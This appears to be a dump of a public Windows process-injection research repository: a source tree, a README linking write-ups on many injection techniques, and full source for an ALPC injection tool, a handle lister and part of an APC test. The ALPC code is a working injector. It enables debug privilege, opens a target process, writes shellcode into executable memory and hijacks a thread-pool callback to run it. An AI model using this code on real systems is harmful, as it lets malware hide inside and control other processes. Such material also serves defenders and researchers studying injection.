Project Path: arc_gmh5225_injection_h39c984g

Source Tree:

```txt
arc_gmh5225_injection_h39c984g
├── README.md
├── alpc
│   ├── Makefile
│   ├── alpc.cpp
│   ├── alpc.exe
│   ├── alpc.obj
│   ├── handle.c
│   ├── handle.exe
│   ├── handle.obj
│   └── payload.bin
├── apc
│   ├── alert.c
│   ├── apc.c
│   └── payload.bin
├── clipboard
│   ├── clipboard.c
│   ├── clipboard.exe
│   ├── clipboard.obj
│   ├── img
│   │   ├── data_transfer_object_clipboard.png
│   │   ├── explorer_clipboard.png
│   │   ├── methods_clipboard.png
│   │   └── window_register.png
│   └── release.bin
├── cmdline
│   ├── bld.bat
│   ├── cmd_inject.c
│   ├── include.inc
│   ├── var_inject.c
│   ├── veh.c
│   ├── wer.h
│   ├── werinfo.c
│   ├── win_inject.c
│   └── winexec1.asm
├── codeptr
│   └── enum.c
├── conhost
│   ├── Makefile
│   ├── chost.c
│   ├── chost.exe
│   ├── chost.obj
│   ├── payload.bin
│   ├── runsc.c
│   ├── runsc.exe
│   └── runsc.obj
├── ctrlinject
│   ├── ctrlinject.c
│   └── handler.bin
├── dde
│   ├── dde.c
│   ├── dde.exe
│   ├── dde.obj
│   └── payload.bin
├── dns
│   ├── dns.cpp
│   ├── dns.exe
│   ├── dns.obj
│   └── dnsalloc.bin
├── eminject
│   ├── bld.bat
│   ├── calc3.asm
│   ├── calc3.h
│   ├── calc4.asm
│   ├── calc4.h
│   ├── poc.c
│   ├── poc_old.c
│   └── test_code
│       ├── calc.asm
│       ├── cp1252_encoder.c
│       ├── cp1252_x86.asm
│       ├── demo.c
│       ├── eminject.c
│       ├── encode.c
│       ├── five.py
│       ├── four.py
│       ├── hello.c
│       ├── notepad.bin
│       ├── nullz_encoder.c
│       ├── one.py
│       ├── three.py
│       ├── three1.py
│       ├── two.py
│       └── two1.py
├── etw
│   ├── callback.bin
│   ├── etw.h
│   └── etwdump.c
├── extrabytes
│   ├── Makefile
│   ├── Makefile.msvc
│   ├── payload.bin
│   └── xorstring.h
├── kct
│   ├── kct.c
│   ├── kct.exe
│   ├── kct.obj
│   └── release.bin
├── knowndlls
│   ├── hello.c
│   └── knowndll.cpp
├── mpr
│   ├── enum.c
│   └── mprdata.h
├── ntlib
│   ├── ntddk.h
│   ├── nttpp.h
│   ├── util.h
│   ├── x64
│   │   └── ntdll.lib
│   └── x86
│       └── ntdll.lib
├── payload
│   ├── x64
│   │   ├── Conhost.txt
│   │   ├── ListView.txt
│   │   ├── alpc.txt
│   │   ├── autocourgette.txt
│   │   ├── build.bat
│   │   ├── clipboard.txt
│   │   ├── ctrl.txt
│   │   ├── dde.txt
│   │   ├── etw.txt
│   │   ├── extrabytes.txt
│   │   ├── getapi.h
│   │   ├── hyphentension.txt
│   │   ├── order.txt
│   │   ├── payload.c
│   │   ├── payload.exe
│   │   ├── payload.obj
│   │   ├── propagate.txt
│   │   ├── release.txt
│   │   ├── streamception.txt
│   │   ├── svcctrl.txt
│   │   ├── treeview.txt
│   │   ├── winsock.txt
│   │   ├── wnf.txt
│   │   ├── wordwarping.txt
│   │   ├── xbin.cpp
│   │   ├── xbin.exe
│   │   └── xbin.obj
│   └── x86
│       ├── Conhost.txt
│       ├── build.bat
│       ├── extrabytes.txt
│       ├── getapi.h
│       ├── payload.c
│       ├── payload.exe
│       ├── payload.obj
│       ├── propagate.txt
│       ├── svcctrl.txt
│       ├── xbin.cpp
│       ├── xbin.exe
│       └── xbin.obj
├── propagate
│   ├── Makefile
│   ├── enumprop.cpp
│   ├── enumprop.exe
│   ├── payload.bin
│   ├── propagate.c
│   ├── propagate.exe
│   └── propagate.obj
├── richedit
│   ├── autocorrect.bin
│   ├── build.bat
│   ├── clipboard.bin
│   ├── hyphenate.bin
│   ├── listplanting.c
│   ├── listview.bin
│   ├── oleum.c
│   ├── stream.bin
│   ├── streamception.c
│   ├── treepoline.c
│   ├── treeview.bin
│   ├── wordbreak.bin
│   └── wordwarping.c
├── spooler
│   ├── Makefile
│   ├── payload.bin
│   ├── spooler.c
│   ├── spooler.exe
│   └── spooler.obj
├── svcctrl
│   ├── Makefile
│   ├── README.md
│   ├── payload.bin
│   ├── svcctrl.c
│   └── svcctrl.obj
├── syscalls
│   ├── hello.c
│   ├── hello.dll
│   ├── inject_dll.c
│   ├── lde.cpp
│   ├── lde.h
│   ├── lde.obj
│   ├── test.cpp
│   ├── test.exe
│   └── test.obj
├── tooltip
│   └── tip.c
├── tpp
│   ├── oletls.h
│   ├── sendmsg.c
│   └── tpplist.c
├── wer
│   ├── werload.c
│   └── wermodule.c
├── wnf
│   ├── payload.bin
│   ├── scanners.c
│   ├── wnf.c
│   ├── wnf.h
│   └── wnfscan.c
└── wsh
    ├── payload.bin
    ├── wsh.c
    └── wsh.h

```

`README.md`:

```md
<h3>Windows Process Injection</h3>

<p>Here are some popular methods used for process injection on the windows operating system.</p>

<ul>
<li><a href="https://modexp.wordpress.com/2018/09/12/process-injection-user-data/">Conhost</a></li>
<li><a href="https://modexp.wordpress.com/2018/08/26/process-injection-ctray/">ExtraBytes</a></li>
<li><a href="https://modexp.wordpress.com/2018/08/23/process-injection-propagate/">PROPagate</a></li>
<li><a href="https://modexp.wordpress.com/2018/08/30/windows-process-injection-control-handler/">Service Control Handler</a></li>
<li><a href="https://modexp.wordpress.com/2019/03/07/process-injection-print-spooler/">Print Spooler / ALPC</a></li>
<li><a href="https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/">KernelCallbackTable</a></li>
<li><a href="https://modexp.wordpress.com/2019/05/24/4066/">CLIPBRDWNDCLASS</a></li>
<li><a href="https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/">WordWarping, Hyphentension, AutoCourgette, Streamception, Oleum, ListPlanting, Treepoline</a></li>
<li><a href="https://modexp.wordpress.com/2019/06/15/4083/">Windows Notification Facility</a></li>
<li><a href="https://modexp.wordpress.com/2019/07/27/process-injection-winsock/">Windows Sockets Helper Functions</a></li>
<li><a href="https://modexp.wordpress.com/2019/08/05/windows-process-injection-scn/">Multiple Provider Router (MPR) DLL and Shell Notifications</a></li>
<li><a href="https://modexp.wordpress.com/2019/08/08/windows-process-injection-dnsapi/">DNS Client API</a></li>
<li><a href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/">Breaking BaDDEr</a></li>
<li><a href="https://modexp.wordpress.com/2019/08/10/windows-process-injection-tooltip-controls/">Tooltip or Common Controls</a></li>
<li><a href="https://modexp.wordpress.com/2019/08/12/windows-process-injection-knowndlls/">KnownDlls Cache Poisoning</a></li>
</ul>


```

`alpc/Makefile`:

```
alpc:
	cl /nologo /MD /EHsc alpc.cpp
	cl /nologo /MD handle.c
clean:
	del *.obj handle.exe alpc.exe
```

`alpc/alpc.cpp`:

```cpp
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../NTlib/util.h"

#include <cstdio>
#include <vector>
#include <string>

typedef struct _process_info_t {
  DWORD                     pid;             // process id
  PWCHAR                    name;            // name of process
  HANDLE                    hp;              // handle of open process
  LPVOID                    payload;         // pointer to shellcode
  DWORD                     payloadSize;     // size of shellcode
  std::vector<std::wstring> ports;           // alpc ports
} process_info;

#define MAX_BUFSIZ            8192
#define INFO_HANDLE_ALPC_PORT 45 // only for Windows 10. probably differs for other systems

/**
  Get a list of ALPC ports with names
*/
DWORD GetALPCPorts(process_info *pi) 
{    
    ULONG                      len=0, total=0;
    NTSTATUS                   status;
    LPVOID                     list=NULL;    
    DWORD                      i;
    HANDLE                     hObj;
    PSYSTEM_HANDLE_INFORMATION hl;
    POBJECT_NAME_INFORMATION   objName;
    
    pi->ports.clear();
    
    // get a list of handles for the local system
    for(len=MAX_BUFSIZ;;len+=MAX_BUFSIZ) {
      list = xmalloc(len);
      status = NtQuerySystemInformation(
          SystemHandleInformation, list, len, &total);
      // break from loop if ok    
      if(NT_SUCCESS(status)) break;
      // free list and continue
      xfree(list);   
    }
    
    hl      = (PSYSTEM_HANDLE_INFORMATION)list;
    objName = (POBJECT_NAME_INFORMATION)xmalloc(8192);
    
    // for each handle
    for(i=0; i<hl->NumberOfHandles; i++) {
      // skip if process ids don't match
      if(hl->Handles[i].UniqueProcessId != pi->pid) continue;

      // skip if the type isn't an ALPC port
      // note this value might be different on other systems.
      // this was tested on 64-bit Windows 10
      if(hl->Handles[i].ObjectTypeIndex != 45) continue;
      
      // duplicate the handle object
      status = NtDuplicateObject(
            pi->hp, (HANDLE)hl->Handles[i].HandleValue, 
            GetCurrentProcess(), &hObj, 0, 0, 0);
            
      // continue with next entry if we failed
      if(!NT_SUCCESS(status)) continue;
      
      // try query the name
      status = NtQueryObject(hObj, 
          ObjectNameInformation, objName, 8192, NULL);
      
      // got it okay?
      if(NT_SUCCESS(status) && objName->Name.Buffer!=NULL) {
        // save to list
        pi->ports.push_back(objName->Name.Buffer);
      }
      // close handle object
      NtClose(hObj); 
    }
    // free list of handles
    xfree(objName);
    xfree(list);
    return pi->ports.size();
}

// connect to ALPC port
BOOL ALPC_Connect(std::wstring path) {
    SECURITY_QUALITY_OF_SERVICE ss;
    NTSTATUS                    status;
    UNICODE_STRING              server;
    ULONG                       MsgLen=0;
    HANDLE                      h;
    
    ZeroMemory(&ss, sizeof(ss));
    ss.Length              = sizeof(ss);
    ss.ImpersonationLevel  = SecurityImpersonation;
    ss.EffectiveOnly       = FALSE;
    ss.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;

    RtlInitUnicodeString(&server, path.c_str());
    
    status = NtConnectPort(&h, &server, &ss, NULL, 
      NULL, (PULONG)&MsgLen, NULL, NULL);
      
    NtClose(h);
    
    return NT_SUCCESS(status);
}
    
// try inject and run payload in remote process using TCO
BOOL ALPC_deploy(process_info *pi, LPVOID ds, PTP_CALLBACK_OBJECT tco) {
    LPVOID             cs = NULL;
    BOOL               bInject = FALSE;
    TP_CALLBACK_OBJECT cpy;    // local copy of tco
    SIZE_T             wr;
    TP_SIMPLE_CALLBACK tp;
    DWORD              i;
    
    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(pi->hp, NULL, 
      pi->payloadSize + sizeof(TP_SIMPLE_CALLBACK), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
    if (cs != NULL) {
        // write payload to remote process
        WriteProcessMemory(pi->hp, cs, pi->payload, pi->payloadSize, &wr);
        // backup TCO
        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT));
        // copy original callback address and parameter
        tp.Function = cpy.Callback.Function;
        tp.Context  = cpy.Callback.Context;
        // write callback+parameter to remote process
        WriteProcessMemory(pi->hp, (LPBYTE)cs + pi->payloadSize, &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback.Function = cs;
        cpy.Callback.Context  = (LPBYTE)cs + pi->payloadSize;
        // update TCO in remote process
        WriteProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
        // trigger execution of payload
        for(i=0;i<pi->ports.size(); i++) {
          ALPC_Connect(pi->ports[i]);
          // read back the TCO
          ReadProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
          // if callback pointer is the original, we succeeded.
          bInject = (cpy.Callback.Function == tco->Callback.Function);
          if(bInject) break;
        }
        // restore the original tco
        WriteProcessMemory(pi->hp, ds, tco, sizeof(cpy), &wr);
        // release memory for payload
        VirtualFreeEx(pi->hp, cs, 
          pi->payloadSize+sizeof(tp), MEM_RELEASE);
    }
    return bInject;
}

// validates a callback object
BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT tco) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // if it's a callback, these values shouldn't be empty  
    if(tco->CleanupGroupMember     == NULL ||
       tco->Pool                   == NULL ||
       tco->CallerAddress.Function == NULL ||
       tco->Callback.Function      == NULL) return FALSE;

    // the CleanupGroupMember should reside in read-only
    // area of image
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->CleanupGroupMember, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READONLY)) return FALSE;
    if (!(mbi.Type & MEM_IMAGE)) return FALSE;
    
    // the pool object should reside in read+write memory
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->Pool, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READWRITE)) return FALSE;

    // the caller function should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->CallerAddress.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;
    
    // the callback function should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->Callback.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);    
}

BOOL FindEnviron(process_info *pi, LPVOID BaseAddress, SIZE_T RegionSize) 
{
    LPBYTE               addr = (LPBYTE)BaseAddress;
    SIZE_T               pos;
    BOOL                 bRead, bFound,bInject=FALSE;
    SIZE_T               rd;
    TP_CALLBACK_OBJECT tco;
    WCHAR                filename[MAX_PATH];
    
    // scan memory for TCO
    for(pos=0; pos<RegionSize; 
      pos += (bFound ? sizeof(TP_CALLBACK_OBJECT) : sizeof(ULONG_PTR))) 
    {
      bFound = FALSE;
      // try read TCO from writeable memory
      bRead = ReadProcessMemory(pi->hp,
        &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT), &rd);

      // if not read, continue
      if(!bRead) continue;
      // if not size of callback environ, continue
      if(rd != sizeof(TP_CALLBACK_OBJECT)) continue;
      
      // is this a valid TCO?
      bFound=IsValidTCO(pi->hp, &tco);
      if(bFound) {
        // obtain module name where callback resides
        GetMappedFileName(pi->hp, (LPVOID)tco.Callback.Function, filename, MAX_PATH);
        // filter by RPCRT4.dll
        if(StrStrI(filename, L"RPCRT4.dll")!=NULL) {
          wprintf(L"Found TCO at %p for %s\n",  addr+pos, filename);
          // try run payload using this TCO
          // if successful, end scan
          bInject = ALPC_deploy(pi, addr+pos, &tco);
          if (bInject) break;
        }
      }
    }
    return bInject;
}

BOOL ALPC_inject(process_info *pi) {
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    BOOL                     bInject=FALSE;
    
    // try open the target process. return on error
    pi->hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->pid);
    if(pi->hp==NULL) return FALSE;

    // obtain a list of ALPC ports. return if none found
    if(!GetALPCPorts(pi)) {
      CloseHandle(pi->hp);
      return FALSE;
    }

    // get memory info
    GetSystemInfo(&si);
    
    // scan virtual memory for this process upto maximum address available    
    for (addr=0; addr<(LPBYTE)si.lpMaximumApplicationAddress;) 
    {
      res = VirtualQueryEx(pi->hp, addr, &mbi, sizeof(mbi));

      // we only want to scan the heap, 
      // but this will scan stack space too.
      // need to fix that..
      if ((mbi.State   == MEM_COMMIT)  &&
          (mbi.Type    == MEM_PRIVATE) && 
          (mbi.Protect == PAGE_READWRITE)) 
      {
        bInject = FindEnviron(pi, mbi.BaseAddress, mbi.RegionSize);
        if(bInject) break;
      }
      // update address to query
      addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(pi->hp);
    return bInject;
}

int main(void) {
    PWCHAR       *argv;
    int          argc;
    process_info pi;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if (argc != 3) {
      wprintf(L"usage: alpc <payload> <process id | process name>\n");
      return 0;
    }
    
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"can't enable debug privilege.\n");
    }
    
    // try read pic
    pi.payloadSize = readpic(argv[1], &pi.payload);
    
    if(pi.payloadSize == 0) { 
      wprintf(L"[-] Unable to read PIC from %s\n", argv[1]); 
      return 0; 
    }

    pi.pid=name2pid(argv[2]);
    
    if(pi.pid==0) pi.pid=_wtoi(argv[2]);
    if(pi.pid==0) { 
      wprintf(L"unable to obtain process id for %s\n", argv[2]);
      return 0;
    }
    wprintf(L"ALPC injection : %s\n", 
      ALPC_inject(&pi) ? L"OK" : L"FAILED");
    return 0;
}


```

`alpc/handle.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../NTlib/util.h"

VOID PrintHandle(DWORD pid, PWCHAR type, PWCHAR name, PWCHAR file) {
    wprintf(L"%-30s:[%5i] %-20s : %s\n", 
        pid2name(pid), pid, type, name==NULL ? file : name);
}
#define MAX_BUFSIZ 8192

VOID ListProcessHandles(DWORD pid, PWCHAR objType, BOOL bNameRequired) {    
    ULONG                      len=0, total=0;
    NTSTATUS                   status;
    LPVOID                     list=NULL;    
    DWORD                      i;
    HANDLE                     hp, hObject;
    OBJECT_BASIC_INFORMATION   obi;
    POBJECT_TYPE_INFORMATION   t;
    POBJECT_NAME_INFORMATION   n;
    PSYSTEM_HANDLE_INFORMATION hl;
    WCHAR                      filename[MAX_PATH];
    PWCHAR                     type, name, file;
    
    // query until we have list of handles
    for(len=MAX_BUFSIZ;;len+=MAX_BUFSIZ) {
      list = xmalloc(len);
      status = NtQuerySystemInformation(
          SystemHandleInformation, list, len, &total);
      // break from loop if ok    
      if(NT_SUCCESS(status)) break;
      // free list and continues
      xfree(list);   
    }
    
    hl = (PSYSTEM_HANDLE_INFORMATION)list;
    t  = (POBJECT_TYPE_INFORMATION)xmalloc(MAX_BUFSIZ);
    n  = (POBJECT_NAME_INFORMATION)xmalloc(MAX_BUFSIZ);

    // for each handle
    for(i=0; i<hl->NumberOfHandles; i++) {
      // skip these to avoid hanging process
      if((hl->Handles[i].GrantedAccess == 0x0012019f) || 
         (hl->Handles[i].GrantedAccess == 0x001a019f) || 
         (hl->Handles[i].GrantedAccess == 0x00120189) || 
         (hl->Handles[i].GrantedAccess == 0x00100000)) {
        continue;
      }

      type=NULL; name=NULL; file=NULL;
      // does user want to filter out process?
      if(pid != 0 && (hl->Handles[i].UniqueProcessId != pid)) {
        continue;
      }
      // open the process to duplicate handle. continue on error
      hp = OpenProcess(PROCESS_DUP_HANDLE, 
        FALSE, hl->Handles[i].UniqueProcessId);
      if(hp==NULL) {
        continue;
      }

      // duplicate the handle object
      status = NtDuplicateObject(
            hp, (HANDLE)hl->Handles[i].HandleValue, 
            GetCurrentProcess(), &hObject, 0, 0, 0);
            
      CloseHandle(hp);
      // continue with next if we failed
      if(!NT_SUCCESS(status)) {
        continue;
      }
      // query basic info about object
      status = NtQueryObject(hObject, 
            ObjectBasicInformation, &obi, 
            sizeof(obi), &len);
            
      if(NT_SUCCESS(status)) {
        // query the type
        status = NtQueryObject(hObject, 
              ObjectTypeInformation, t, 
              MAX_BUFSIZ, NULL);
                  
        // okay? store the type
        if (NT_SUCCESS(status)) {
          type = t->TypeName.Buffer;
        }
        // if there's a name for this object
        if(obi.NameInfoSize != 0) {
          // query the name
          status = NtQueryObject(hObject, 
                ObjectNameInformation, n, 
                MAX_BUFSIZ, NULL);
          // okay? store the name
          if(NT_SUCCESS(status)) {
            name = n->Name.Buffer;
          }
        } else {
          // try get the filename
          ZeroMemory(filename, ARRAYSIZE(filename));
          len=GetFinalPathNameByHandle(hObject, 
            filename, MAX_PATH, VOLUME_NAME_NT);
          // okay? store the filename
          if(len!=0) {
            file = filename;
          }
        }
      }
      // close handle object
      NtClose(hObject); 
      // skip it if we didn't get a name for this object
      if(bNameRequired) {
        if(name==NULL && file==NULL) continue;
      }
      // is this the right object type?
      if(objType!=NULL && (StrStrI(type, objType)==NULL)) continue;
      PrintHandle(hl->Handles[i].UniqueProcessId, type, name, file);
    }
    xfree(t);
    xfree(n);
    // free list of handles
    xfree(list);
}

void usage(void) {
    wprintf(L"\nusage: handle <id | name> /t <type> /n\n");
    wprintf(L"    /t <type> : Type of objects to find. i.e: section, event, mutant, alpc, file.\n");
    wprintf(L"    /n        : Don't require name for object.\n\n");
    exit(0);
}

int main(void) {
    DWORD   pid=0;
    PWCHAR  *argv, type=NULL,process=NULL;
    BOOL    bName=TRUE; // skip objects with no name
    int     i, argc;
    wchar_t opt;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    for(i=1;i<argc;i++) {
      if((argv[i][0]==L'/') || (argv[i][0]==L'-')) {
        opt=argv[i][1];
        switch(opt) {
          // specify type of object
          case L't':
          case L'T':
            type=argv[++i];
            break;
          // don't require a name for object
          case L'n':
          case L'N':
            bName=FALSE;
            break;
          case L'?':
          case L'h':
          case L'H':
          default:
            usage();
            break;
        }
      } else {
        process=argv[i];
      }
    }
    // if the user provides parameter
    // assume it's a string name for process or process id
    if(process!=NULL) {
      pid=name2pid(process);
      if(pid==0) pid=wcstoull(process, NULL, 10);
      if(pid==0) { 
        usage();
      }
    }
    SetPrivilege(SE_DEBUG_NAME, TRUE);
    ListProcessHandles(pid, type, bName);
    return 0;
}
```

`apc/alert.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
/**
  Example output on Windows 10

  PC: 00007FFF1491C6E4 ntdll.dll!ZwDelayExecution
  Queuing APC for SleepEx.
  SleepEx ended

  PC: 00007FFF1491C0E4 ntdll.dll!NtWaitForSingleObject
  Queuing APC for WaitForSingleObjectEx.
  WaitForSingleObjectEx ended

  PC: 00007FFF1491CBB4 ntdll.dll!NtWaitForMultipleObjects
  Queuing APC for WaitForMultipleObjectsEx.
  WaitForMultipleObjectsEx ended

  PC: 00007FFF1491F654 ntdll.dll!NtSignalAndWaitForSingleObject
  Queuing APC for SignalObjectAndWait.
  SignalObjectAndWait ended

  PC: 00007FFF126C9A84 win32u.dll!NtUserMsgWaitForMultipleObjectsEx
  Queuing APC for MsgWaitForMultipleObjectsEx.
  MsgWaitForMultipleObjectsEx ended

  PC: 00007FFF1491CBB4 ntdll.dll!NtWaitForMultipleObjects
  Queuing APC for WSAWaitForMultipleEvents.
  WSAWaitForMultipleEvents ended

  PC: 00007FFF1491ED94 ntdll.dll!NtRemoveIoCompletionEx
  Queuing APC for GetQueuedCompletionStatusEx.
  GetQueuedCompletionStatusEx ended

  PC: 00007FFF1491C0E4 ntdll.dll!NtWaitForSingleObject
  Queuing APC for GetOverlappedResultEx.
  GetOverlappedResultEx ended

*/

#define UNICODE

#include <windows.h>
#include <dbghelp.h>
#include <shlwapi.h>
#include <psapi.h>
#include <stdio.h>
#include <wchar.h>
#include <wct.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ws2_32.lib")

// resolve symbol for addr without using SymFromName
PWCHAR addr2sym(HANDLE hp, LPVOID addr) {
    WCHAR        path[MAX_PATH];
    BYTE         buf[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO si=(PSYMBOL_INFO)buf;
    static WCHAR name[MAX_PATH];
    
    ZeroMemory(path, ARRAYSIZE(path));
    ZeroMemory(name, ARRAYSIZE(name));
          
    GetMappedFileName(
      hp, addr, path, MAX_PATH);
    
    PathStripPath(path);
    
    si->SizeOfStruct = sizeof(SYMBOL_INFO);
    si->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (DWORD64)addr, NULL, si)) {
      wsprintf(name, L"%s!%hs", path, si->Name);
    } else {
      lstrcpy(name, path);
    }
    return name;
}

DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    HANDLE           port, *evt = (HANDLE)lpParameter;
    OVERLAPPED       lap;
    OVERLAPPED_ENTRY lapentry;
    ULONG            ulNumEntriesRemoved;
    
    // 1.
    SleepEx(0x12345678, TRUE);
    printf("SleepEx ended\n");

    // 2.
    WaitForSingleObjectEx(evt[0], 0x12345678, TRUE);
    printf("WaitForSingleObjectEx ended\n");

    // 3.
    WaitForMultipleObjectsEx(2, evt, FALSE, 0x12345678, TRUE);
    printf("WaitForMultipleObjectsEx ended\n");

    // 4.
    SignalObjectAndWait(evt[1], evt[0], 0x12345678, TRUE);
    printf("SignalObjectAndWait ended\n");

    // 5.
    ResetEvent(evt[0]);
    ResetEvent(evt[1]);
    MsgWaitForMultipleObjectsEx(2, evt, 
      0x12345678, QS_RAWINPUT, MWMO_ALERTABLE);
    printf("MsgWaitForMultipleObjectsEx ended\n");

    // 6.
    WSAWaitForMultipleEvents(2, evt, FALSE, 0x12345678, TRUE);
    printf("WSAWaitForMultipleEvents ended\n");
    
    // 7.
    port = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    GetQueuedCompletionStatusEx(port, &lapentry, 1, 
      &ulNumEntriesRemoved, INFINITE, TRUE);
    printf("GetQueuedCompletionStatusEx ended\n");
    CloseHandle(port);
    
    // 8.
    ZeroMemory(&lap, sizeof(lap));
    lap.hEvent = evt[0];
    GetOverlappedResultEx(evt[2], &lap, NULL, 0x12345678, TRUE);
    printf("GetOverlappedResultEx ended\n");
    
    return 0;
}

int main(void) {  
    HANDLE              ht, h[3];
    LPVOID              m, f;
    DWORD               i;
    CONTEXT             c;
    
    char *api[8]={
      "SleepEx", 
      "WaitForSingleObjectEx",
      "WaitForMultipleObjectsEx",
      "SignalObjectAndWait",
      "MsgWaitForMultipleObjectsEx",
      "WSAWaitForMultipleEvents",
      "GetQueuedCompletionStatusEx",
      "GetOverlappedResultEx"};
    
    h[0] = CreateEvent(NULL, FALSE, FALSE, NULL);
    h[1] = CreateEvent(NULL, FALSE, FALSE, NULL);
